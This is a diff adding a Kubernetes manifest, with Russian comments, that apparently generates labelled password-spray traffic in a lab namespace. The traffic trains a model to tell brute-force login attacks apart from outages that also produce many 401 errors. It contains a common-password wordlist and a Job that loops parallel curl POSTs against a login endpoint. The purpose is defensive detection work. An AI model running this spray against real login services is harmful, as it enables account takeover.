@@ -1,0 +1,100 @@
+# 20 · attack · Перебор паролей на /api/auth/login (password spray) через Traefik.
+# ATT&CK: T1110 (Brute Force)
+# Инструмент: curl (параллельный password-spray, curlimages/curl)
+# Ожидаемый след: всплеск rps_401_403 и rps_4xx на backend; RPS в целом умеренный.
+#                 ВНЕШНЕ похоже на сбой «сломанный релиз / упавшая авторизация» (тоже много
+#                 401) — этому различию учим модель.
+# Гипотеза: brute-force даёт узкий «долбящий» поток 401 на один эндпоинт логина, в отличие
+#           от сбоя, где 401/4xx размазаны по всему API.
+#
+# Почему curl, а не hydra: login принимает ТОЛЬКО JSON, а модуль hydra http-post-form
+# заточен под form-urlencoded и не парсит условие успеха для JSON-ответа (проверено на стенде).
+# curl шлёт корректный JSON и даёт гарантированный 401 — техника и метрический след те же.
+# Словарь и цель — из ConfigMap (RULES.md R-5: без зашитых кредов). Цикл до activeDeadlineSeconds.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: attack-bruteforce-wordlist
+  namespace: redlab
+data:
+  target-email: "victim@example.com"
+  passwords.txt: |
+    123456
+    password
+    123456789
+    qwerty
+    12345678
+    111111
+    1234567890
+    admin
+    letmein
+    welcome
+    monkey
+    dragon
+    football
+    iloveyou
+    admin123
+    qwerty123
+    000000
+    abc123
+    password1
+    root
+    toor
+    pass
+    test
+    guest
+    changeme
+    secret
+    master
+    hello
+    login
+    passw0rd
+    zaq12wsx
+    qazwsx
+    trustno1
+    superman
+    batman
+    sunshine
+    princess
+    baseball
+    shadow
+    michael
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: attack-bruteforce
+  namespace: redlab
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 600
+  activeDeadlineSeconds: 150
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: bruteforce
+          image: curlimages/curl:latest
+          command: ["sh", "-c"]
+          args:
+            - |
+              EMAIL="$(cat /data/target-email)"
+              BASE="http://traefik.kube-system.svc.cluster.local"
+              echo "[attack] password-spray $EMAIL против $BASE/api/auth/login"
+              while true; do
+                while IFS= read -r PW; do
+                  [ -z "$PW" ] && continue
+                  curl -s -o /dev/null -X POST "$BASE/api/auth/login" \
+                    -H "Content-Type: application/json" \
+                    -d "{\"email\":\"$EMAIL\",\"password\":\"$PW\"}" &
+                done < /data/passwords.txt
+                wait
+              done
+          resources:
+            requests: {cpu: 100m, memory: 64Mi}
+            limits: {cpu: 500m, memory: 256Mi}
+          volumeMounts:
+            - {name: data, mountPath: /data}
+      volumes:
+        - name: data
+          configMap: {name: attack-bruteforce-wordlist}
